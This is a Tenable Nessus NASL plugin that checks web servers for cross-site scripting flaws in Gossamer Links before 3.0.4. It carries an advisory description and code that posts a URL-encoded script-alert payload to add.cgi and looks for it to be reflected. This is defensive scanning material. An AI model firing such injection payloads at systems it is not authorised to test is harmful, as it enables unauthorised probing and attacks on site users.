#
# (C) Tenable Network Security
#


if (description) {
  script_id(19235);
  script_version("$Revision: 1.5 $");

  script_bugtraq_id(14160);
  if (defined_func("script_xref")) {
    script_xref(name:"OSVDB", value:"17742");
    script_xref(name:"OSVDB", value:"17743");
  }

  name["english"] = "Gossamer Links < 3.0.4 Multiple Cross-Site Scripting Vulnerabilities";
  script_name(english:name["english"]);
 
  desc["english"] = "
Synopsis :

The remote web server contains CGI scripts that are prone to cross-
site scripting attacks. 

Description :

The remote host is running Gossamer Links, a web links management tool
from Gossamer Threads and written in Perl. 

The installed version of Gossamer Links fails to properly sanitize
user-supplied input to various parameters of the 'user.cgi' and
'add.cgi' scripts, which are used by an administrator.  By leveraging
this flaw, an attacker may be able to cause arbitrary HTML and script
code to be executed by a user's browser within the context of the
affected application, leading to cookie theft and similar attacks. 

See also :

http://www.nessus.org/u?67268918

Solution : 

Upgrade to Gossamer Links 3.0.4 or later.

Risk factor : 

Low / CVSS Base Score : 2
(AV:R/AC:H/Au:NR/C:N/A:N/I:P/B:N)";
  script_description(english:desc["english"]);
 
  summary["english"] = "Checks for multiple cross-site scripting vulnerabilities in Gossamer Links < 3.0.4";
  script_summary(english:summary["english"]);
 
  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses : XSS");

  script_copyright(english:"This script is Copyright (C) 2005-2006 Tenable Network Security");

  script_dependencies("http_version.nasl", "cross_site_scripting.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);

  exit(0);
}


include("global_settings.inc");
include("http_func.inc");
include("http_keepalive.inc");


port = get_http_port(default:80);
if (!get_port_state(port)) exit(0);
if (get_kb_item("www/" + port + "/generic_xss")) exit(0);


# A simple alert.
xss = '<script>alert("' + SCRIPT_NAME + '");</script>';
# nb: the url-encoded version is what we need to pass in.
exss = '%3Cscript%3Ealert("' + SCRIPT_NAME + '")%3B%3C%2Fscript%3E';


# Loop through CGI directories.
foreach dir (cgi_dirs()) {
  # Check whether a flawed script exists.
  #
  # nb: check for add.cgi since user.cgi sometimes doesn't exist.
  req = http_get(item:string(dir, "/add.cgi"), port:port);
  res = http_keepalive_send_recv(port:port, data:req, bodyonly:TRUE);
  if (res == NULL) exit(0);

  # If it does...
  if (egrep(string:res, pattern:'<FORM action=".+/add.cgi" method=POST>')) {
    # Identify a category.
    pat = 'SELECT NAME="Category" +SIZE=1><OPTION>.+<OPTION>([^<]+)<OPTION>';
    matches = egrep(pattern:pat, string:res, icase:TRUE);
    if (matches) {
      foreach match (split(matches)) {
        match = chomp(match);
        cat = eregmatch(pattern:pat, string:match);
        if (!isnull(cat)) {
          cat = cat[1];
          break;
        }
      }
    }

    if (isnull(cat)) {
      if (log_verbosity > 1) debug_print("couldn't select a category for adding a link!", level:0);
    }
    else {
      # Try to exploit one of the flaws.
      postdata = string(
        "Title=", SCRIPT_NAME, "+Test&",
        "URL=http://www.nessus.org/&",
        # nb: this really should be url-encoded!
        "Category=", cat, "&",
        "Description=Nessus+is+checking+for+flaws+in+Gossamer+Links&",
        "Contact+Name=", exss, "&",
        "Contact+Email=na@", get_host_name()
      );
      req = string(
        "POST ", dir, "/add.cgi HTTP/1.1\r\n",
        "Host: ", get_host_name(), "\r\n",
        "User-Agent: ", get_kb_item("global_settings/http_user_agent"), "\r\n",
        # nb: this script needs a valid referer!
        "Referer: http://", get_host_name(), dir, "/add.cgi\r\n",
        "Content-Type: application/x-www-form-urlencoded\r\n",
        "Content-Length: ", strlen(postdata), "\r\n",
        "\r\n",
        postdata
      );
      res = http_keepalive_send_recv(port:port, data:req, bodyonly:TRUE);
      if (res == NULL) exit(0);

      # There's a problem if we see our XSS as the Contact Name.
      if (egrep(string:res, pattern:string("Contact Name: +", xss))) {
        security_note(port);
        exit(0);
      }
    }
  }
}
